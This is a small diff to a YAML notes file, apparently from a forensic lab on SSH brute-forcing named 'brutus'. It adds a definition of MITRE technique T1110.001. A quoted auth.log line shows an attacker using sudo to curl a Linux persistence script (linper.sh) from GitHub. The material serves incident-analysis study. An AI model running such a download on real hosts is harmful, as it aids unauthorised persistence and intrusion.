@@ -137,6 +137,11 @@ cards:
       [Mar 6 06:39:38] ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
 
 #stuff
+notes:
+  - |
+    T1110.001 – Password Guessing: An attacker uses automated tools to brute-force different password combinations to gain access to a target account.
+
+#stuff
 configure:
   prompt: "/home/ningen/brutus>"
 ---
